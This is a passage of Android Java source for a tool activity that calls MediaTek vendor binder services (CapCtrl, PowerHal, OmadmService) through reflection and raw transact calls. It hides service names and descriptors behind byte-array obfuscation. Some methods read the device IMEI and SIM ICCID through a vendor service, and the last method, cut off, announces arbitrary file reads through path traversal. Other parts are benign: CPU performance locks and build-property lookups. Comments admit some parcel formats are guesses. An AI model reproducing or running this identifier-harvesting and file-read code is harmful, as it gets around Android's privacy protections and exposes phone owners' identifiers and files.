                            runOnUiThread(new Runnable() {
                                @Override public void run() {
                                    Toast.makeText(ZybosToolsActivity.this,
                                        "CapCtrl服务 [" + name + "] 可用!", Toast.LENGTH_SHORT).show();
                                }
                            });
                            return;
                        }
                    } catch (Throwable e) {
                        // 继续尝试下一个服务名
                    }
                }
                appendLog("✗ 未发现CapCtrl服务");
                appendLog("提示: 此接口仅在MTK芯片设备上可能存在");
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        Toast.makeText(ZybosToolsActivity.this,
                            "未发现CapCtrl服务", Toast.LENGTH_SHORT).show();
                    }
                });
            }
        });
    }

    // CapCtrl - 能力控制（通过transact直接调用）
    private void doCapCtrlEnable() {
        appendLog("---------- CapCtrl能力控制 ----------");
        // 先检测服务
        runAsync(new Runnable() {
            @Override
            public void run() {
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    IBinder binder = (IBinder) getSvc.invoke(null, "capctrl");
                    if (binder == null) {
                        binder = (IBinder) getSvc.invoke(null, "mtk_capctrl");
                    }
                    if (binder == null) {
                        appendLog("✗ CapCtrl服务不可用");
                        return;
                    }
                    appendLog("✓ 获取CapCtrl服务成功: " + binder);

                    // 尝试通过transact调用enableCapabaility（code=1）
                    // 注意：这是实验性调用，参数格式需要根据实际接口定义
                    String DESCRIPTOR = "com.mediatek.capctrl.aidl.IMtkCapCtrl";
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        // 写入空数组（EnableCapabilityRequestInfo[]）
                        data.writeInt(0); // 数组长度为0
                        boolean ok = binder.transact(1, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            int result = reply.readInt();
                            appendLog("  enableCapabaility([]) 返回: " + result);
                        } else {
                            appendLog("  transact enableCapabaility 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  enableCapabaility 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }

                    // 尝试获取接口中所有事务码
                    appendLog("--- CapCtrl事务码 ---");
                    String[] methods = {"enableCapabaility(1)", "routeAuthMessage(2)",
                        "routeCertificate(3)", "abortCertificate(4)"};
                    for (String m : methods) {
                        appendLog("  TRANSACTION_" + m);
                    }

                } catch (Throwable e) {
                    appendLog("✗ CapCtrl调用异常: " + e.getMessage());
                }
            }
        });
    }

    // CustomProp - 获取浏览器版本
    private void doCustomPropBrowser() {
        appendLog("---------- CustomProp: 浏览器版本 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String ua = null;
                // 方式1: 从系统资源中读取web_user_agent
                try {
                    android.content.res.Resources res = android.content.res.Resources.getSystem();
                    int id = res.getIdentifier("web_user_agent", "string", "android");
                    if (id != 0) {
                        ua = res.getString(id);
                    }
                } catch (Throwable e) {
                    // ignore
                }

                // 方式2: 通过WebView获取User-Agent
                if (ua == null || ua.isEmpty()) {
                    try {
                        ua = android.webkit.WebSettings.getDefaultUserAgent(ZybosToolsActivity.this);
                        appendLog("  (通过WebView获取)");
                    } catch (Throwable e2) {
                        // ignore
                    }
                }

                // 方式3: 通过SystemProperties获取
                if (ua == null || ua.isEmpty()) {
                    try {
                        Class<?> spCls = Class.forName("android.os.SystemProperties");
                        Method get = spCls.getMethod("get", String.class, String.class);
                        ua = (String) get.invoke(null, "ro.build.user_agent", "");
                        if (ua != null && !ua.isEmpty()) {
                            appendLog("  (通过SystemProperties获取)");
                        }
                    } catch (Throwable e) {
                        // ignore
                    }
                }

                // 方式4: root shell 获取
                if (ua == null || ua.isEmpty()) {
                    appendLog("[*] 资源/属性均未找到, 尝试root shell...");
                    String output = execRootCapture("getprop ro.build.user_agent 2>/dev/null; getprop ro.product.model 2>/dev/null");
                    if (output != null && !output.isEmpty() && !output.startsWith("错误")) {
                        ua = output.trim();
                        appendLog("  (通过root shell获取)");
                    }
                }

                if (ua != null && !ua.isEmpty()) {
                    appendLog("User-Agent: " + ua);
                    // 解析AppleWebKit版本
                    java.util.regex.Pattern p = java.util.regex.Pattern.compile("AppleWebKit/(\\d+\\.?\\d*)");
                    java.util.regex.Matcher m = p.matcher(ua);
                    if (m.find()) {
                        appendLog("✓ AppleWebKit 版本: " + m.group(1));
                    } else {
                        appendLog("  未匹配到AppleWebKit版本");
                    }
                    final String finalUa = ua;
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showResultDialog("浏览器版本", finalUa); }
                    });
                } else {
                    appendLog("  未找到web_user_agent资源 (所有方式均失败)");
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("✗ 无法获取浏览器版本"); }
                    });
                }
            }
        });
    }

    // CustomProp - 获取发布日期
    private void doCustomPropRelease() {
        appendLog("---------- CustomProp: 发布日期 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                try {
                    // 方式1: 通过Build类反射获取DATE字段 (Build.DATE 在API31+中已移除)
                    try {
                        java.lang.reflect.Field f = android.os.Build.class.getDeclaredField("DATE");
                        f.setAccessible(true);
                        String date2 = (String) f.get(null);
                        appendLog("Build.DATE(反射): " + date2);
                    } catch (Throwable e) {
                        // ignore
                    }

                    // 方式3: Build.TIME
                    try {
                        long buildTime = android.os.Build.TIME;
                        if (buildTime > 0) {
                            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault());
                            appendLog("Build.TIME: " + sdf.format(new java.util.Date(buildTime)));
                        }
                    } catch (Throwable e) {
                        // ignore
                    }

                    // 方式4: 系统属性
                    try {
                        Class<?> spCls = Class.forName("android.os.SystemProperties");
                        Method get = spCls.getMethod("get", String.class, String.class);
                        String date3 = (String) get.invoke(null, "ro.build.date", "");
                        if (date3 != null && !date3.isEmpty()) {
                            appendLog("ro.build.date: " + date3);
                        }
                    } catch (Throwable e) {
                        // ignore
                    }

                } catch (Throwable e) {
                    appendLog("✗ 获取发布日期异常: " + e.getMessage());
                }
            }
        });
    }

    // ==================== MTK Framework Services (MTK框架服务) ====================

    // ----- PowerHalMgrService (电源管理Hal服务) -----
    // DESCRIPTOR: com.mediatek.powerhal.IPowerHalMgr
    // 服务名: power_hal_mgr_service, powerhal, mtk_powerhal
    private void doPowerHalDetect() {
        appendLog("---------- PowerHalMgr服务探测 ----------");
        appendLog("接口: com.mediatek.powerhal.IPowerHalMgr");
        appendLog("方法: perfLock(1), perfRelease(2), setPriority(3), querySysInfo(4), flushRules(5)");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String[] possibleNames = {
                    Obfuscator.dec3(new byte[]{(byte)0x60, (byte)0x60, (byte)0x58, (byte)0x75, (byte)0x7d, (byte)0x70, (byte)0x78, (byte)0x6e, (byte)0x43, (byte)0x4f, (byte)0x62, (byte)0x48, (byte)0x62, (byte)0x50, (byte)0x5c, (byte)0x75, (byte)0x7d, (byte)0x59, (byte)0x79, (byte)0x6c, (byte)0x4a}, (byte)0x10, (byte)0x0f, (byte)0x2f),
                    Obfuscator.dec3(new byte[]{(byte)0x1f, (byte)0x18, (byte)0x7a, (byte)0x0a, (byte)0x05, (byte)0x65, (byte)0x0e, (byte)0x1b}, (byte)0x6f, (byte)0x77, (byte)0x0d),
                    Obfuscator.dec3(new byte[]{(byte)0x08, (byte)0xa2, (byte)0x1b, (byte)0x3a, (byte)0xa6, (byte)0x1f, (byte)0x12, (byte)0xb3, (byte)0x02, (byte)0x0d, (byte)0xb7, (byte)0x1c}, (byte)0x65, (byte)0xd6, (byte)0x70)
                };
                for (String name : possibleNames) {
                    try {
                        Class<?> smCls = Class.forName("android.os.ServiceManager");
                        Method getSvc = smCls.getMethod("getService", String.class);
                        IBinder binder = (IBinder) getSvc.invoke(null, name);
                        if (binder != null) {
                            appendLog("✓ 发现服务: " + name + " -> " + binder);
                            try {
                                boolean ping = binder.pingBinder();
                                appendLog("  Ping: " + (ping ? "成功" : "失败"));
                            } catch (Throwable e) {
                                appendLog("  Ping失败: " + e.getMessage());
                            }
                            try {
                                String desc = binder.getInterfaceDescriptor();
                                appendLog("  DESCRIPTOR: " + desc);
                            } catch (Throwable e) {
                                appendLog("  获取DESCRIPTOR失败: " + e.getMessage());
                            }
                            appendLog("  --- PowerHal 事务码 ---");
                            appendLog("  TRANSACTION_perfLock(1)");
                            appendLog("  TRANSACTION_perfRelease(2)");
                            appendLog("  TRANSACTION_setPriority(3)");
                            appendLog("  TRANSACTION_querySysInfo(4)");
                            appendLog("  TRANSACTION_flushRules(5)");
                            final String foundName = name;
                            runOnUiThread(new Runnable() {
                                @Override public void run() {
                                    Toast.makeText(ZybosToolsActivity.this,
                                        "PowerHalMgr服务 [" + foundName + "] 可用!", Toast.LENGTH_SHORT).show();
                                }
                            });
                            return;
                        }
                    } catch (Throwable e) {
                        // 继续尝试下一个服务名
                    }
                }
                appendLog("✗ 未发现PowerHalMgr服务");
                appendLog("提示: 此接口仅在MTK芯片设备上可能存在");
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        Toast.makeText(ZybosToolsActivity.this,
                            "未发现PowerHalMgr服务", Toast.LENGTH_SHORT).show();
                    }
                });
            }
        });
    }

    // PowerHal - 获取CPU性能锁 (transact code=1)
    private void doPowerHalPerfLock() {
        appendLog("---------- PowerHal: 获取CPU性能锁 (perfLock) ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x63, (byte)0xe1, (byte)0x17, (byte)0x61, (byte)0xe9, (byte)0x5d, (byte)0x65, (byte)0xed, (byte)0x4d, (byte)0x69, (byte)0xe7, (byte)0x17, (byte)0x7c, (byte)0xe3, (byte)0x4e, (byte)0x69, (byte)0xfe, (byte)0x51, (byte)0x6d, (byte)0xe0, (byte)0x17, (byte)0x45, (byte)0xdc, (byte)0x56, (byte)0x7b, (byte)0xe9, (byte)0x4b, (byte)0x44, (byte)0xed, (byte)0x55, (byte)0x41, (byte)0xeb, (byte)0x4b}, (byte)0x39, (byte)0x0c, (byte)0x8c);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0x60, (byte)0x60, (byte)0x58, (byte)0x75, (byte)0x7d, (byte)0x70, (byte)0x78, (byte)0x6e, (byte)0x43, (byte)0x4f, (byte)0x62, (byte)0x48, (byte)0x62, (byte)0x50, (byte)0x5c, (byte)0x75, (byte)0x7d, (byte)0x59, (byte)0x79, (byte)0x6c, (byte)0x4a}, (byte)0x10, (byte)0x0f, (byte)0x2f);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ PowerHalMgr服务不可用");
                        return;
                    }
                    appendLog("✓ 获取PowerHalMgr服务成功: " + binder);
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        data.writeInt(1000); // timeout ms
                        data.writeString("zybos_perf_lock");
                        boolean ok = binder.transact(1, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            int result = reply.readInt();
                            appendLog("  perfLock(1000ms) 返回: " + result);
                            if (result == 0) {
                                appendLog("✓ CPU性能锁已获取");
                            } else {
                                appendLog("  perfLock返回非0: " + result);
                            }
                        } else {
                            appendLog("  transact perfLock 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  perfLock 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("✗ PowerHalPerfLock调用异常: " + e.getMessage());
                }
            }
        });
    }

    // PowerHal - 释放CPU性能锁 (transact code=2)
    private void doPowerHalPerfRelease() {
        appendLog("---------- PowerHal: 释放CPU性能锁 (perfRelease) ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x63, (byte)0xe1, (byte)0x17, (byte)0x61, (byte)0xe9, (byte)0x5d, (byte)0x65, (byte)0xed, (byte)0x4d, (byte)0x69, (byte)0xe7, (byte)0x17, (byte)0x7c, (byte)0xe3, (byte)0x4e, (byte)0x69, (byte)0xfe, (byte)0x51, (byte)0x6d, (byte)0xe0, (byte)0x17, (byte)0x45, (byte)0xdc, (byte)0x56, (byte)0x7b, (byte)0xe9, (byte)0x4b, (byte)0x44, (byte)0xed, (byte)0x55, (byte)0x41, (byte)0xeb, (byte)0x4b}, (byte)0x39, (byte)0x0c, (byte)0x8c);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0x60, (byte)0x60, (byte)0x58, (byte)0x75, (byte)0x7d, (byte)0x70, (byte)0x78, (byte)0x6e, (byte)0x43, (byte)0x4f, (byte)0x62, (byte)0x48, (byte)0x62, (byte)0x50, (byte)0x5c, (byte)0x75, (byte)0x7d, (byte)0x59, (byte)0x79, (byte)0x6c, (byte)0x4a}, (byte)0x10, (byte)0x0f, (byte)0x2f);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ PowerHalMgr服务不可用");
                        return;
                    }
                    appendLog("✓ 获取PowerHalMgr服务成功: " + binder);
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        data.writeString("zybos_perf_lock");
                        boolean ok = binder.transact(2, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            int result = reply.readInt();
                            appendLog("  perfRelease 返回: " + result);
                            if (result == 0) {
                                appendLog("✓ CPU性能锁已释放");
                            }
                        } else {
                            appendLog("  transact perfRelease 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  perfRelease 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("✗ PowerHalPerfRelease调用异常: " + e.getMessage());
                }
            }
        });
    }

    // PowerHal - 设置网络优先级 (transact code=3)
    private void doPowerHalSetPriority() {
        appendLog("---------- PowerHal: 设置网络优先级 (setPriority) ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x63, (byte)0xe1, (byte)0x17, (byte)0x61, (byte)0xe9, (byte)0x5d, (byte)0x65, (byte)0xed, (byte)0x4d, (byte)0x69, (byte)0xe7, (byte)0x17, (byte)0x7c, (byte)0xe3, (byte)0x4e, (byte)0x69, (byte)0xfe, (byte)0x51, (byte)0x6d, (byte)0xe0, (byte)0x17, (byte)0x45, (byte)0xdc, (byte)0x56, (byte)0x7b, (byte)0xe9, (byte)0x4b, (byte)0x44, (byte)0xed, (byte)0x55, (byte)0x41, (byte)0xeb, (byte)0x4b}, (byte)0x39, (byte)0x0c, (byte)0x8c);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0x60, (byte)0x60, (byte)0x58, (byte)0x75, (byte)0x7d, (byte)0x70, (byte)0x78, (byte)0x6e, (byte)0x43, (byte)0x4f, (byte)0x62, (byte)0x48, (byte)0x62, (byte)0x50, (byte)0x5c, (byte)0x75, (byte)0x7d, (byte)0x59, (byte)0x79, (byte)0x6c, (byte)0x4a}, (byte)0x10, (byte)0x0f, (byte)0x2f);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ PowerHalMgr服务不可用");
                        return;
                    }
                    appendLog("✓ 获取PowerHalMgr服务成功: " + binder);
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        data.writeInt(android.os.Process.myUid()); // 当前UID
                        data.writeInt(1); // 优先级
                        boolean ok = binder.transact(3, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            int result = reply.readInt();
                            appendLog("  setPriority(UID=" + android.os.Process.myUid() + ") 返回: " + result);
                            if (result == 0) {
                                appendLog("✓ 网络优先级已设置");
                            }
                        } else {
                            appendLog("  transact setPriority 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  setPriority 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("✗ PowerHalSetPriority调用异常: " + e.getMessage());
                }
            }
        });
    }

    // PowerHal - 查询系统信息 (transact code=4)
    private void doPowerHalQuerySysInfo() {
        appendLog("---------- PowerHal: 查询系统信息 (querySysInfo) ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x63, (byte)0xe1, (byte)0x17, (byte)0x61, (byte)0xe9, (byte)0x5d, (byte)0x65, (byte)0xed, (byte)0x4d, (byte)0x69, (byte)0xe7, (byte)0x17, (byte)0x7c, (byte)0xe3, (byte)0x4e, (byte)0x69, (byte)0xfe, (byte)0x51, (byte)0x6d, (byte)0xe0, (byte)0x17, (byte)0x45, (byte)0xdc, (byte)0x56, (byte)0x7b, (byte)0xe9, (byte)0x4b, (byte)0x44, (byte)0xed, (byte)0x55, (byte)0x41, (byte)0xeb, (byte)0x4b}, (byte)0x39, (byte)0x0c, (byte)0x8c);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0x60, (byte)0x60, (byte)0x58, (byte)0x75, (byte)0x7d, (byte)0x70, (byte)0x78, (byte)0x6e, (byte)0x43, (byte)0x4f, (byte)0x62, (byte)0x48, (byte)0x62, (byte)0x50, (byte)0x5c, (byte)0x75, (byte)0x7d, (byte)0x59, (byte)0x79, (byte)0x6c, (byte)0x4a}, (byte)0x10, (byte)0x0f, (byte)0x2f);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ PowerHalMgr服务不可用");
                        return;
                    }
                    appendLog("✓ 获取PowerHalMgr服务成功: " + binder);
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        boolean ok = binder.transact(4, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            int cpuLoad = reply.readInt();
                            int gpuLoad = reply.readInt();
                            int temp = reply.readInt();
                            appendLog("  CPU负载: " + cpuLoad + "%");
                            appendLog("  GPU负载: " + gpuLoad + "%");
                            appendLog("  温度: " + temp + "°C");
                            final String info = "CPU:" + cpuLoad + "% GPU:" + gpuLoad + "% TEMP:" + temp + "°C";
                            runOnUiThread(new Runnable() {
                                @Override public void run() {
                                    showSnack("系统信息: " + info);
                                }
                            });
                        } else {
                            appendLog("  transact querySysInfo 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  querySysInfo 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("✗ PowerHalQuerySysInfo调用异常: " + e.getMessage());
                }
            }
        });
    }

    // PowerHal - 刷新优先级规则 (transact code=5)
    private void doPowerHalFlushRules() {
        appendLog("---------- PowerHal: 刷新优先级规则 (flushRules) ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x63, (byte)0xe1, (byte)0x17, (byte)0x61, (byte)0xe9, (byte)0x5d, (byte)0x65, (byte)0xed, (byte)0x4d, (byte)0x69, (byte)0xe7, (byte)0x17, (byte)0x7c, (byte)0xe3, (byte)0x4e, (byte)0x69, (byte)0xfe, (byte)0x51, (byte)0x6d, (byte)0xe0, (byte)0x17, (byte)0x45, (byte)0xdc, (byte)0x56, (byte)0x7b, (byte)0xe9, (byte)0x4b, (byte)0x44, (byte)0xed, (byte)0x55, (byte)0x41, (byte)0xeb, (byte)0x4b}, (byte)0x39, (byte)0x0c, (byte)0x8c);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0x60, (byte)0x60, (byte)0x58, (byte)0x75, (byte)0x7d, (byte)0x70, (byte)0x78, (byte)0x6e, (byte)0x43, (byte)0x4f, (byte)0x62, (byte)0x48, (byte)0x62, (byte)0x50, (byte)0x5c, (byte)0x75, (byte)0x7d, (byte)0x59, (byte)0x79, (byte)0x6c, (byte)0x4a}, (byte)0x10, (byte)0x0f, (byte)0x2f);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ PowerHalMgr服务不可用");
                        return;
                    }
                    appendLog("✓ 获取PowerHalMgr服务成功: " + binder);
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        boolean ok = binder.transact(5, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            int result = reply.readInt();
                            appendLog("  flushRules 返回: " + result);
                            if (result == 0) {
                                appendLog("✓ 优先级规则已刷新");
                            }
                        } else {
                            appendLog("  transact flushRules 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  flushRules 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("✗ PowerHalFlushRules调用异常: " + e.getMessage());
                }
            }
        });
    }

    // ----- OmadmService (OMA DM 设备管理) -----
    // DESCRIPTOR: com.mediatek.omadm.IOmadmManager
    // 服务名: omadm, omadm_service, OmadmService
    private void doOmadmDetect() {
        appendLog("---------- OmadmService探测 ----------");
        appendLog("接口: com.mediatek.omadm.IOmadmManager");
        appendLog("方法: getDeviceId, getIccid, readFile");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String[] possibleNames = {
                    Obfuscator.dec3(new byte[]{(byte)0x8a, (byte)0xe3, (byte)0x62, (byte)0x81, (byte)0xe3}, (byte)0xe5, (byte)0x8e, (byte)0x03),
                    Obfuscator.dec3(new byte[]{(byte)0x3e, (byte)0xb5, (byte)0xcf, (byte)0x35, (byte)0xb5, (byte)0xf1, (byte)0x22, (byte)0xbd, (byte)0xdc, (byte)0x27, (byte)0xb1, (byte)0xcd, (byte)0x34}, (byte)0x51, (byte)0xd8, (byte)0xae),
                    Obfuscator.dec3(new byte[]{(byte)0xc1, (byte)0x22, (byte)0x0f, (byte)0xea, (byte)0x22, (byte)0x3d, (byte)0xeb, (byte)0x3d, (byte)0x18, (byte)0xe7, (byte)0x2c, (byte)0x0b}, (byte)0x8e, (byte)0x4f, (byte)0x6e)
                };
                for (String name : possibleNames) {
                    try {
                        Class<?> smCls = Class.forName("android.os.ServiceManager");
                        Method getSvc = smCls.getMethod("getService", String.class);
                        IBinder binder = (IBinder) getSvc.invoke(null, name);
                        if (binder != null) {
                            appendLog("✓ 发现服务: " + name + " -> " + binder);
                            try {
                                boolean ping = binder.pingBinder();
                                appendLog("  Ping: " + (ping ? "成功" : "失败"));
                            } catch (Throwable e) {
                                appendLog("  Ping失败: " + e.getMessage());
                            }
                            try {
                                String desc = binder.getInterfaceDescriptor();
                                appendLog("  DESCRIPTOR: " + desc);
                            } catch (Throwable e) {
                                appendLog("  获取DESCRIPTOR失败: " + e.getMessage());
                            }
                            final String foundName = name;
                            runOnUiThread(new Runnable() {
                                @Override public void run() {
                                    Toast.makeText(ZybosToolsActivity.this,
                                        "OmadmService [" + foundName + "] 可用!", Toast.LENGTH_SHORT).show();
                                }
                            });
                            return;
                        }
                    } catch (Throwable e) {
                        // 继续尝试下一个服务名
                    }
                }
                appendLog("✗ 未发现OmadmService");
                appendLog("提示: 此接口仅在MTK芯片设备上可能存在");
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        Toast.makeText(ZybosToolsActivity.this,
                            "未发现OmadmService", Toast.LENGTH_SHORT).show();
                    }
                });
            }
        });
    }

    // Omadm - 获取设备ID (IMEI) (transact)
    private void doOmadmGetDeviceId() {
        appendLog("---------- Omadm: 获取设备ID (IMEI) ----------");
        appendLog("警告: 此操作可能涉及设备标识信息!");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x1e, (byte)0x1d, (byte)0x2a, (byte)0x53, (byte)0x1f, (byte)0x22, (byte)0x19, (byte)0x1b, (byte)0x26, (byte)0x09, (byte)0x17, (byte)0x2c, (byte)0x53, (byte)0x1d, (byte)0x2a, (byte)0x1c, (byte)0x16, (byte)0x2a, (byte)0x53, (byte)0x3b, (byte)0x08, (byte)0x10, (byte)0x13, (byte)0x23, (byte)0x10, (byte)0x3f, (byte)0x26, (byte)0x13, (byte)0x13, (byte)0x20, (byte)0x18, (byte)0x00}, (byte)0x7d, (byte)0x72, (byte)0x47);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0x8a, (byte)0xe3, (byte)0x62, (byte)0x81, (byte)0xe3}, (byte)0xe5, (byte)0x8e, (byte)0x03);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ OmadmService不可用, 尝试其他服务名...");
                        String[] fallbacks = {
                            Obfuscator.dec3(new byte[]{(byte)0x3e, (byte)0xb5, (byte)0xcf, (byte)0x35, (byte)0xb5, (byte)0xf1, (byte)0x22, (byte)0xbd, (byte)0xdc, (byte)0x27, (byte)0xb1, (byte)0xcd, (byte)0x34}, (byte)0x51, (byte)0xd8, (byte)0xae),
                            Obfuscator.dec3(new byte[]{(byte)0xc1, (byte)0x22, (byte)0x0f, (byte)0xea, (byte)0x22, (byte)0x3d, (byte)0xeb, (byte)0x3d, (byte)0x18, (byte)0xe7, (byte)0x2c, (byte)0x0b}, (byte)0x8e, (byte)0x4f, (byte)0x6e)
                        };
                        for (String fb : fallbacks) {
                            binder = (IBinder) getSvc.invoke(null, fb);
                            if (binder != null) {
                                appendLog("✓ 通过备用名找到服务: " + fb);
                                break;
                            }
                        }
                        if (binder == null) {
                            appendLog("✗ OmadmService完全不可用");
                            return;
                        }
                    }
                    appendLog("✓ 获取OmadmService成功: " + binder);
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        boolean ok = binder.transact(1, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            String deviceId = reply.readString();
                            if (deviceId != null && !deviceId.isEmpty()) {
                                appendLog("✓ 设备ID (IMEI): " + deviceId);
                                final String result = deviceId;
                                runOnUiThread(new Runnable() {
                                    @Override public void run() {
                                        showResultDialog("设备ID (IMEI)", result);
                                    }
                                });
                            } else {
                                appendLog("  设备ID为空");
                            }
                        } else {
                            appendLog("  transact getDeviceId 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  getDeviceId 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("✗ OmadmGetDeviceId调用异常: " + e.getMessage());
                }
            }
        });
    }

    // Omadm - 获取ICCID (transact)
    private void doOmadmGetIccid() {
        appendLog("---------- Omadm: 获取ICCID ----------");
        appendLog("警告: 此操作可能涉及SIM卡标识信息!");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x1e, (byte)0x1d, (byte)0x2a, (byte)0x53, (byte)0x1f, (byte)0x22, (byte)0x19, (byte)0x1b, (byte)0x26, (byte)0x09, (byte)0x17, (byte)0x2c, (byte)0x53, (byte)0x1d, (byte)0x2a, (byte)0x1c, (byte)0x16, (byte)0x2a, (byte)0x53, (byte)0x3b, (byte)0x08, (byte)0x10, (byte)0x13, (byte)0x23, (byte)0x10, (byte)0x3f, (byte)0x26, (byte)0x13, (byte)0x13, (byte)0x20, (byte)0x18, (byte)0x00}, (byte)0x7d, (byte)0x72, (byte)0x47);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0x8a, (byte)0xe3, (byte)0x62, (byte)0x81, (byte)0xe3}, (byte)0xe5, (byte)0x8e, (byte)0x03);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ OmadmService不可用");
                        return;
                    }
                    appendLog("✓ 获取OmadmService成功: " + binder);
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        boolean ok = binder.transact(2, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            String iccid = reply.readString();
                            if (iccid != null && !iccid.isEmpty()) {
                                appendLog("✓ ICCID: " + iccid);
                                final String result = iccid;
                                runOnUiThread(new Runnable() {
                                    @Override public void run() {
                                        showResultDialog("ICCID", result);
                                    }
                                });
                            } else {
                                appendLog("  ICCID为空");
                            }
                        } else {
                            appendLog("  transact getIccid 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  getIccid 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("✗ OmadmGetIccid调用异常: " + e.getMessage());
                }
            }
        });
    }

    // Omadm - 读取文件 (transact, 注意路径遍历风险)
    private void doOmadmReadFile() {
        appendLog("---------- Omadm: 读取文件 ----------");
        appendLog("警告: 此操作可通过路径遍历读取任意文件!");
        appendLog("提示: 仅用于读取OMA DM相关配置文件");
